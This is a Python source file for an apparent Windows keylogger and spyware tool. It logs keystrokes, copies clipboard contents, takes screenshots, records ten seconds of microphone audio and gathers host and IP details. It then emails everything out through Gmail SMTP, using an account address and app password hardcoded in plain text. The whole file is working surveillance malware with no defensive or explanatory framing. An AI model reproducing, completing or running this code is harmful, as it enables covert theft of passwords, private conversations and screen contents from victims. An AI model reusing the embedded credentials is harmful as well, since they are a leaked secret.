from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
from cryptography.fernet import Fernet
from pynput.keyboard import Key, Listener
from multiprocessing import process, freeze_support
from PIL import ImageGrab
from requests import get
from scipy.io.wavfile import write
import smtplib, socket, platform, win32clipboard, os, time, getpass, sounddevice as sd, tempfile, re

fileName = getpass.getuser()+".log"
sysName = getpass.getuser()+"_sys.txt"
clipName = getpass.getuser()+".txt"
rcdName = getpass.getuser()+".wav"
ssName = getpass.getuser()+".png"
filePath = os.path.join(tempfile.gettempdir(), fileName)
sysPath = os.path.join(tempfile.gettempdir(), sysName)
clipPath = os.path.join(tempfile.gettempdir(), clipName)
rcdPath = os.path.join(tempfile.gettempdir(), rcdName)
ssPath = os.path.join(tempfile.gettempdir(),ssName)

email = "defalttests@gmail.com"
password = "wkqy ozkd sbjm jhbf"

count = 0
keys = []

def sendMail(subject, fileName, attachment):
    try:
        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = email
        msg['Subject'] = subject
        
        json = MIMEBase('application', 'octet-stream')
        json.set_payload(open(attachment, 'rb').read())
        encoders.encode_base64(json)
        json.add_header('Content-Disposition', 'attachment; filename = {}'.format(fileName))
        msg.attach(json)
        
        smtp = smtplib.SMTP("smtp.gmail.com", 587)
        smtp.starttls()
        smtp.login(email, password= password)
        smtp.sendmail(email,email,msg.as_string())
        smtp.quit()
    except:
        print('error gottedd !! for '+ attachment + fileName )
        pass

def fetchSystem():
    with open(sysPath, 'a') as f:
        hostName = socket.gethostname()
        private = socket.gethostbyname(hostName)
        try:
            public = get("https://api.ipify.org").text
            f.write("Public IP Address : "+public+'\n')
        except Exception:
            f.write("Couldn't fetch public IP(possibly max query)\n")
        
        f.write("Processor : "+platform.processor()+'\n')
        f.write("System : "+platform.system()+" Version : "+platform.version()+'\n')
        f.write("Machine : "+platform.machine()+'\n')
        f.write("Hostname : "+hostName+'\n')
        f.write("Private IP Address : "+private+'\n')
        f.close()

def fetchClipData():
    with open(clipPath, 'a') as f:
        try:
            win32clipboard.OpenClipboard()
            clipData = win32clipboard.GetClipboardData()
            f.write(clipData+'\n')
            win32clipboard.CloseClipboard()
        except:
            f.write("Couldn't fetch clipboard data.\n")
        f.close()

def fetchRcd():
    sf = 44100
    rcd = sd.rec(int(10*sf),samplerate=sf,channels=2)
    sd.wait()
    write(rcdPath, sf, rcd)

def fetchSs():
    ss=ImageGrab.grab()
    ss.save(ssPath)
        
def onPress(key):
    global count, keys
    #print(key)
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        writeFile(keys)
        keys = []

def writeFile(keys):
    with open(filePath, 'a') as f:
        for key in keys:
            formatted = str(key).replace("'", "")
            print(f"Debug: {repr(formatted)}") 
            if formatted.find('space') > 0:
                f.write(' ')
                f.close()
            elif formatted.find('enter') > 0:
                f.write('\n')
                f.close()
            elif formatted == '\\\\':
                f.write("\\")
                f.close()
            # elif formatted == '\\x03':
            #     fetchClipData(clipPath=clipPath)
            #     f.close()
            elif formatted.find('Key') == -1:
                f.write(formatted)
                f.close()

def onRelease(key):
    if key==Key.esc:
        return True

def reset():
    try:
        if os.path.exists(ssPath):
            os.remove(ssPath)
        if os.path.exists(rcdPath):
            os.remove(rcdPath)
        open(filePath, 'w').close()
        open(clipPath, 'w').close()
        open(sysPath, 'w').close()
    except:
        pass
        

def run():
    fetchSs()
    fetchRcd()
    sendMail(subject=getpass.getuser()+" key logs", fileName=fileName, attachment=filePath)
    sendMail(subject=getpass.getuser()+" clip logs", fileName=clipName, attachment=clipPath)
    sendMail(subject=getpass.getuser()+" sys logs", fileName=sysName, attachment=sysPath)
    sendMail(subject=getpass.getuser()+" screenshot logs", fileName=ssName, attachment=ssPath)
    sendMail(subject=getpass.getuser()+" mic logs", fileName=rcdName, attachment=rcdPath)
    reset()
    fetchSystem()
    fetchClipData()
    with Listener(on_press = onPress, on_release = onRelease) as listener:
        print("starts listening")
        listener.join()
        print("passed it instantly!")

if __name__ == "__main__":
    run()